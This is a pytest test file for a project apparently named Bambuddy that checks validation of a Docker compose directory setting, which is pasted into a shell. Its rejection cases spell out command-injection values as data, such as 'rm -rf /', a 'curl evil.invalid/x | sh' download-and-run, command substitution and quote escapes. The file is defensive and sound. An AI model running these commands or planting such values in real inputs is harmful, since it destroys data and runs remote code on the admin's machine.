"""``docker_compose_dir`` validation (#2664, reporter pchulpjoost).

This setting is not consumed by Bambuddy at all — it is interpolated into a
shell command that the Settings page invites the user to copy and paste into a
root-capable terminal. That inverts the usual threat model for a string
setting: the danger is not what the server does with the value, it is what the
*admin* does with it after the copy button hands it over. Anyone holding
settings:update could otherwise plant a destructive one-liner behind a control
whose whole purpose is "paste this into your shell".
"""

import pytest
from pydantic import ValidationError

from backend.app.schemas.settings import AppSettingsUpdate


class TestComposeDirValidation:
    @pytest.mark.parametrize(
        "value",
        [
            "/opt/bambuddy",
            "/srv/stacks/bambu buddy",  # spaces are legal; the frontend quotes them
            "C:\\Users\\martin\\bambuddy",
            "~/bambuddy",
            "/home/martin/3D-Druck/bambuddy",  # non-ASCII path components
            "",
        ],
    )
    def test_accepts_real_paths(self, value: str):
        assert AppSettingsUpdate(docker_compose_dir=value).docker_compose_dir == value.strip()

    @pytest.mark.parametrize(
        "value",
        [
            "/opt/bambuddy; rm -rf /",
            "/opt/bambuddy && curl evil.invalid/x | sh",
            "/opt/bambuddy`id`",
            "/opt/bambuddy$(id)",
            "/opt/bambuddy | tee /etc/passwd",
            '/opt/bambuddy" && echo pwned && echo "',
            "/opt/bambuddy\nrm -rf /",
        ],
    )
    def test_rejects_shell_metacharacters(self, value: str):
        """Every one of these renders as a plausible-looking update command
        that does something else entirely when pasted."""
        with pytest.raises(ValidationError):
            AppSettingsUpdate(docker_compose_dir=value)

    def test_rejects_absurd_length(self):
        with pytest.raises(ValidationError):
            AppSettingsUpdate(docker_compose_dir="/opt/" + "a" * 600)

    def test_none_is_untouched(self):
        """None means "not part of this PATCH" — distinct from "" ("clear it")."""
        assert AppSettingsUpdate().docker_compose_dir is None

    @pytest.mark.parametrize("char", ['"', "$", "`"])
    def test_characters_that_would_escape_the_frontend_quoting_are_rejected(self, char: str):
        """The frontend wraps a value containing a space in double quotes, which
        is safe only because nothing that is special inside double quotes can
        survive this validator. Pinned here so loosening the pattern without
        revisiting the quoting fails loudly."""
        with pytest.raises(ValidationError):
            AppSettingsUpdate(docker_compose_dir=f"/opt/bam {char} buddy")

    def test_trailing_backslash_rejected(self):
        """The last character that would still escape the closing quote:
        `cd "/opt/bam buddy\\"` swallows the rest of the command."""
        with pytest.raises(ValidationError):
            AppSettingsUpdate(docker_compose_dir="C:\\bam buddy\\")

    def test_windows_path_without_trailing_separator_survives(self):
        assert AppSettingsUpdate(docker_compose_dir="C:\\Users\\martin\\bambuddy").docker_compose_dir == (
            "C:\\Users\\martin\\bambuddy"
        )
